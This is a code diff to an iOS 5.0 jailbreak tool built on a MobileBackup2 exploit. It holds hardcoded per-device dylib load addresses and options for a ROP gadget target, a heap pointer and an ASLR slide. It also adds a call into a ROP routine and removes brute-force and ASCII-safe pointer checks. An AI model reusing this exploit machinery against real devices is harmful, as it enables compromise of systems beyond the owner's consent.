@@ -30,6 +30,7 @@
 #include <libimobiledevice/sbservices.h>
 
 #include "mb1.h"
+#include "rop.h"
 #include "debug.h"
 #include "backup.h"
 #include "device.h"
@@ -69,8 +70,8 @@ static struct dev_vmaddr devices_vmaddr_libcopyfile[] = {
 	{ "iPhone2,1", "9A405", 0x34a52000 },
 	{ "iPhone3,1", "9A405", 0x30654000 },
 	{ "iPhone3,3", "9A405", 0 },
-	{ "iPhone4,1", "9A405", 0x31f57000 },
-	{ "iPhone4,1", "9A406", 0x31f54000 }, // verify
+	{ "iPhone4,1", "9A405", 0x31f54000 },
+	{ "iPhone4,1", "9A406", 0x31f57000 },
 	{ "iPod3,1", "9A405", 0x35202000 },
 	{ "iPod4,1", "9A405", 0x30c29000 },
 	{ NULL, NULL, 0 }
@@ -86,51 +87,12 @@ static struct option longopts[] = {
 	{ "help",        no_argument,         NULL,   'h' },
 	{ "verbose",     required_argument,   NULL,   'v' },
 	{ "uuid",        required_argument,   NULL,   'u' },
-	{ "loop",        required_argument,   NULL,   'l' },
-	{ "salt",        required_argument,   NULL,   's' },
-	{ "entropy",     required_argument,   NULL,   'e' },
 	{ "target",      required_argument,   NULL,   't' },
 	{ "pointer",     required_argument,   NULL,   'p' },
 	{ "aslr-slide",  required_argument,   NULL,   'a' },
-	{ "cache",       required_argument,   NULL,   'c' },
-	{ "dylib",       required_argument,   NULL,   'd' },
 	{ NULL, 0, NULL, 0 }
 };
 
-int check_ascii_string(const char* string, size_t length) {
-	size_t i = 0;
-	if (string) {
-		// Loop through each byte in this string and make sure it contains no invalid
-		//  ASCII characters that might screw up our exploit
-		for (i = 0; i < length; i++) {
-			char letter = string[i];
-			if ((letter & 0x80) > 0 || (letter & 0x7F) == 0) {
-				// We have an invalid ASCII character here folks!
-				return kFalse;
-			}
-		}
-	}
-
-	return kTrue;
-}
-
-int check_ascii_pointer(uint32_t pointer) {
-	if((pointer & 0x80808080) > 0) {
-		//debug("FAIL\n");
-		return 0;
-	}
-	//debug("Passed ASCII test\n");
-	if((pointer & 0x7F000000) == 0 ||
-		(pointer & 0x007F0000) == 0 ||
-		(pointer & 0x00007F00) == 0 ||
-		(pointer & 0x0000007F) == 0) {
-		//debug("FAIL\n");
-		//debug("0x%08x & 0x7F7F7F7F = 0x%08x\n", pointer, (pointer & 0x7F7F7F7F));
-		return 0;
-	}
-	//debug("PASS\n");
-	return 1;
-}
 void status_plist_cb(plist_t* newplist, void *userdata) {
 	debug("Status plist callback invoked!!!\n");
 }
@@ -161,14 +123,6 @@ crashreport_t* fetch_crashreport(device_t* device) {
 	}
 	crashreporter_free(reporter);
 	return crash;
-}
-
-int prepare_attack() {
-	return 0;
-}
-
-int bruteforce_string() {
-	return 0;
 }
 
 crashreport_t* crash_mobilebackup(device_t* device) {
@@ -604,23 +558,17 @@ static void clean_exit(int sig)
 void usage(int argc, char* argv[]) {
 	char* name = strrchr(argv[0], '/');
 	printf("Usage: %s [OPTIONS]\n", (name ? name + 1 : argv[0]));
-	printf("Copyright 2011, Chronic-Dev LLC\n");
+	printf("(c) 2011-2012, Chronic-Dev LLC\n");
 	printf("Jailbreak iOS5.0 using ub3rl33t MobileBackup2 exploit.\n");
-	printf("Discovered by Nikias Bassen, Exploited by Joshua Hill\n");
+	//printf("Discovered by Nikias Bassen, Exploited by Joshua Hill\n");
 	printf("  General\n");
 	printf("    -h, --help\t\t\tprints usage information\n");
 	printf("    -v, --verbose\t\tprints debuging info while running\n");
 	printf("    -u, --uuid UUID\t\ttarget specific device by its 40-digit device UUID\n");
-	printf("\n  Brute Forcing\n");
-	printf("    -l, --loop AMOUNT\t\tloop the attack AMOUNT number of times\n");
-	printf("    -s, --salt NUMBER\t\tsalt the random number generator with this number\n");
-	printf("    -e, --entropy NUMBER\tdecides how random we make our fuzzing attack\n");
 	printf("\n  Payload Generation\n");
 	printf("    -t, --target ADDRESS\toffset to ROP gadget we want to execute\n");
 	printf("    -p, --pointer ADDRESS\theap address we're hoping contains our target\n");
 	printf("    -a, --aslr-slide OFFSET\tvalue of randomized dyldcache slide\n");
-	printf("    -c, --cache FILE\t\tcurrent devices dyldcache for finding ROP gadget\n");
-	printf("    -d, --dylib NAME\t\tname of dylib to search for ROP gadget in\n");
 	printf("\n");
 }
 
@@ -631,24 +579,19 @@ int main(int argc, char* argv[]) {
 	int optindex = 0;
 
 	int verbose = 0;
-	char* dylib = NULL;
-	char* cache = NULL;
 	unsigned long aslr_slide = 0;
 	unsigned long pointer = 0;
 	unsigned long target = 0;
-	unsigned long entropy = 0;
-	unsigned long salt = 0;
 	char* uuid = NULL;
-	unsigned long loop = 0;
 
-	char* buildver = NULL;
+	char* build = NULL;
 	char* product = NULL;
 
 #ifndef WIN32
 	signal(SIGPIPE, SIG_IGN);
 #endif
 
-	while ((opt = getopt_long(argc, argv, "hvd:c:a:p:t:e:s:u:l:", longopts, &optindex)) > 0) {
+	while ((opt = getopt_long(argc, argv, "hva:p:t:u:", longopts, &optindex)) > 0) {
 		switch (opt) {
 		case 'h':
 			usage(argc, argv);
@@ -656,14 +599,6 @@ int main(int argc, char* argv[]) {
 
 		case 'v':
 			verbose++;
-			break;
-
-		case 'd':
-			dylib = optarg;
-			break;
-
-		case 'c':
-			cache = optarg;
 			break;
 
 		case 'a':
@@ -678,20 +613,8 @@ int main(int argc, char* argv[]) {
 			target = strtoul(optarg, NULL, 0);
 			break;
 
-		case 'e':
-			entropy = strtoul(optarg, NULL, 0);
-			break;
-
-		case 's':
-			salt = strtoul(optarg, NULL, 0);
-			break;
-
 		case 'u':
 			uuid = strdup(optarg);
-			break;
-
-		case 'l':
-			loop = strtoul(optarg, NULL, 0);
 			break;
 
 		default:
@@ -756,36 +679,10 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	plist_t pl = NULL;
-	if ((lockdown_get_value(lockdown, NULL, "ProductType", &pl) != 0) || !pl || (plist_get_node_type(pl) != PLIST_STRING)) {
-		error("Could not get ProductType\n");
+	if ((lockdown_get_string(lockdown, "ProductType", &product) != LOCKDOWN_E_SUCCESS)
+			|| (lockdown_get_string(lockdown, "BuildVersion", &build) != LOCKDOWN_E_SUCCESS)) {
+		error("Could not get device information\n");
 		lockdown_free(lockdown);
-		device_free(device);
-		if (pl) {
-			plist_free(pl);
-		}
-		return -1;
-	}
-	plist_get_string_val(pl, &product);
-	if (!product) {
-		error("ProductType is NULL?!\n");
-		device_free(device);
-		return -1;
-	}
-
-	pl = NULL;
-	if ((lockdown_get_value(lockdown, NULL, "BuildVersion", &pl) != 0) || !pl || (plist_get_node_type(pl) != PLIST_STRING)) {
-		error("Could not get BuildVersion\n");
-		lockdown_free(lockdown);
-		device_free(device);
-		if (pl) {
-			plist_free(pl);
-		}
-		return -1;
-	}
-	plist_get_string_val(pl, &buildver);
-	if (!buildver) {
-		error("BuildVersion is NULL?!\n");
 		device_free(device);
 		return -1;
 	}
@@ -795,7 +692,7 @@ int main(int argc, char* argv[]) {
 	uint32_t libcopyfile_vmaddr = 0;
 	while (devices_vmaddr_libcopyfile[i].product) {
 		if (!strcmp(product, devices_vmaddr_libcopyfile[i].product)
-		    && !strcmp(buildver, devices_vmaddr_libcopyfile[i].build)) {
+		    && !strcmp(build, devices_vmaddr_libcopyfile[i].build)) {
 			libcopyfile_vmaddr = devices_vmaddr_libcopyfile[i].vmaddr;
 			debug("Found libcopyfile.dylib address in database of 0x%x\n", libcopyfile_vmaddr);
 			break;
@@ -810,6 +707,7 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	plist_t pl = NULL;
 	if ((lockdown_get_value(lockdown, "com.apple.mobile.backup", "WillEncrypt", &pl) != 0) || (plist_get_node_type(pl) != PLIST_BOOLEAN)) {
 		error("Error: could not get com.apple.mobile.backup WillEncrypt key?!\n");
 		lockdown_free(lockdown);
@@ -1151,22 +1049,7 @@ int main(int argc, char* argv[]) {
 
 	printf("0x%x\n", dscs);
 
-	// If aslr slide wasn't specified on the command line go ahead and figure it out ourself
-	/*if(aslr_slide == 0) {
-		// In order for us to calculate this offset ourself, we must have access
-		//  to a dyldcache for this device and firmware version
-		if(cache == NULL) {
-			error("You must specify either --cache or --aslr-slide arguments\n");
-			return -1;
-		}
-
-		// We have the required arguments, so we can calculate this parameter ourselves
-		debug("Calculating dyldcache ASLR offset\n");
-		aslr_slide = find_aslr_slide(crash, cache);
-		if(aslr_slide == 0) {
-			error("Unable to calculate ASLR offset\n");
-		}
-	}*/
+	ropMain(dscs);
 
 	/********************************************************/
 	/* add com.apple.ipsec.plist to backup */
